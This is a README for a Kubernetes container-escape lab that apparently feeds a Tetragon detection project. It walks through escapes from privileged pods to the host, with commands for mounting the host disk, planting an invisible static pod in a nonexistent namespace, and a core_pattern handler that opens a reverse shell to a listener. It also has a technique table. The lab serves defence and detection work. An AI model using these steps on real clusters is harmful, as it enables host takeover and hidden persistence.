# Container Escape Lab

Lab environment for demonstrating classic **container → host escapes** from a
*privileged* (or badly-configured) pod, and the platform-default settings that
allow or block each one.

This is a **controlled/test-only** environment. Run only in a dedicated node
you own. Everything here is root-on-its-own-node by design.

## Layout — one directory per real scenario

```
container-escape/
├── find-privileged-pods.sh   # discover attackable pods (privileged/hostPID/hostNetwork)
├── SCENARIO.md               # end-to-end scenario lab on the real cluster
├── README.md
├── 01-privileged-workload-scenario/   # verified escape: any privileged DaemonSet → host rootfs
│   ├── README.md                  # the single how-to guide (steps 0–6)
│   ├── helpers/                   # static mount helper + Makefile (prebuilt included)
│   │   ├── Makefile  mnt.c  mnt
│   ├── manifests/
│   │   └── node-telemetry.yaml     # invisible-pod manifest (drop into kubelet dir)
│   └── kubelet-exec.py             # kubelet /exec websocket client (cert or SA token)
└── 02-core-pattern-scenario/         # verified escape: core_pattern pipe handler → host-root shell
    ├── README.md                  # the single how-to guide (steps 0–7)
    ├── handlers/
    │   └── handler.sh             # core_pattern pipe handler (drains dump, dials back)
    └── helpers/                   # static reverse-shell helper + Makefile (prebuilt included)
        ├── Makefile  revsh.c  revsh
```

Each real workload scenario gets its own `NN-NNN-scenario/` directory. The
generic permissive-pod manifests and technique scripts from the early version
were removed during the restructure — only `find-privileged-pods.sh` was kept
(workload-agnostic).

## Threat model

All techniques below assume the attacker already has **code execution inside a
container** and the pod is:

- `privileged: true` (all capabilities + device access), and/or
- `hostPID: true` (shared PID namespace so host processes are visible/ptrace-able),
- and possibly `hostPath` mounts of host filesystem bits.

The escapes do **not** depend on the Kubernetes or containerd version — they
depend on pod `securityContext` and on **kernel / distro defaults**.

## Discover attackable pods

```sh
bash tetragon-lab/container-escape/find-privileged-pods.sh            # all namespaces
bash tetragon-lab/container-escape/find-privileged-pods.sh kube-system
```

Reveals which pods carry `privileged` / `hostPID` / `hostNetwork` — those are
the realistic targets (calico-node, kube-proxy, CNI/log agents). On this lab
cluster, calico-node and kube-proxy show up privileged+hostNetwork, and the
control-plane components hostNetwork-only (good control group).

## Verified scenarios

### 01-privileged-workload-scenario — privileged DaemonSet → host rootfs → invisible pod

Follow `01-privileged-workload-scenario/README.md` — a single step-by-step
guide (steps 0–6). It was verified against **calico-node** but applies to any
`privileged: true` node-wide workload (flannel, cilium, kube-proxy, CSI,
Falco/Sysdig/Fluent Bit, custom telemetry agents):

1. **Find the target** — `find-privileged-pods.sh` lists every privileged pod
   on **your** cluster.
2. **Mount host disk** — upload the static `mnt` helper → `mnt mount /dev/vda1
   /mnt` → `coreutils --coreutils-prog=chroot /mnt` (agent images usually lack
   `mount`/`tar`/`chmod`; coreutils provides chroot).
3. **Invisible static pod** — write a privileged+hostPID+hostNetwork pod
   manifest with a **nonexistent namespace** into `/etc/kubernetes/manifests/`
   — kubelet runs it, the API never mirrors it.
4. **Kubelet API exec** (optional) — authenticate to `:10250` with the admin
   client cert and exec a shell into the invisible pod (`nsenter -t 1 -a`).

### 02-core-pattern-scenario — core_pattern pipe handler → host-root shell

Follow `02-core-pattern-scenario/README.md`. Different primitive: instead of
mounting the host disk, the escape **makes the kernel execute code** through
the core-dump pipe handler. Also verified against calico-node, and this one
needs **only `privileged: true`** — no hostPID, no hostPath:

1. Stage the handler + a static reverse-shell binary (`revsh`) in the pod —
   they land on the host-visible overlay upperdir.
2. `echo '|/host/path/handler IP PORT' > /proc/sys/kernel/core_pattern` —
   a global, non-namespaced sysctl the privileged pod can write.
3. Crash any process (`ulimit -c unlimited; kill -s SEGV $$`) — the kernel
   runs the handler as **host root in the init namespaces**.
4. The handler drains the dump and dials back to your listener with the
   static `revsh` helper (the `nc`/`/dev/tcp` replacement for modern images).

## Precursor knowledge (see chat notes)

- containerd (1.6/1.7/2.x) applies **no default seccomp**. `RuntimeDefault`
  is only applied when the pod asks for it (or kubelet `seccompDefault: true`,
  opt-in, GA since k8s 1.27).
- Kubernetes default is seccomp **Unconfined**; kubeadm does not enable
  `seccompDefault`.
- **cgroup v1 vs v2** is decided by the OS/kernel, not by Kubernetes/containerd:
  - Ubuntu 20.04 GA (kernel 5.4): **cgroup v1** default → classic release_agent escape.
  - Ubuntu 22.04 / 24.04: **cgroup v2** default → boots with
    `systemd.unified_cgroup_hierarchy=0` to force v1.
- `uevent_helper` needs the kernel built with `CONFIG_UEVENT_HELPER` — **absent
  on every modern distro kernel**; not demoable there.
- Ubuntu 24.04 AppArmor restricts unprivileged user namespaces (another reason
  the DirtyFrag demo ran on 22.04).

## Classic techniques quick reference

| Technique                 | Prereq in pod          | Host-side default that gates it                    |
|---------------------------|------------------------|---------------------------------------------------|
| core_pattern              | `privileged: true` only — pod `/proc/sys` is rw, and the sysctl is non-namespaced | handler must be host-visible + executable (overlay upperdir, no `noexec`) |
| ptrace injection          | `hostPID: true` + `CAP_SYS_PTRACE` | `kernel.yama.ptrace_scope` |
| cgroup release_agent (v1) | privileged, root       | cgroup **v1** (`/sys/fs/cgroup/cpu,cpuacct`)        |
| namespace pivot (nsenter/pivot_root) | privileged (+hostPID) | any; needs util-linux in pod        |
| uevent_helper             | privileged + writable `/sys` | **needs `CONFIG_UEVENT_HELPER` kernel — not available** |

## What does NOT work / why

- `uevent_helper`: kernel config removed on distros. Only a custom-built
  kernel with `CONFIG_UEVENT_HELPER=y` demos it.
- cgroup v1 release_agent on cgroup v2 nodes: node must be booted with
  `systemd.unified_cgroup_hierarchy=0`, or use Ubuntu 20.04 GA.

## Next steps (Tetragon)

Policy hooks for these primitives (`__x64_sys_unshare`, `socket(AF_NETLINK)`,
`mount`, `pivot_root`, writes to `/proc/sys` via kprobe on `proc_sys_write`,
capability use, cgroup writes) live in `../policy/`. The observability stack
(Helm Loki + Alloy shipping events to Grafana) lives in `../observability/`.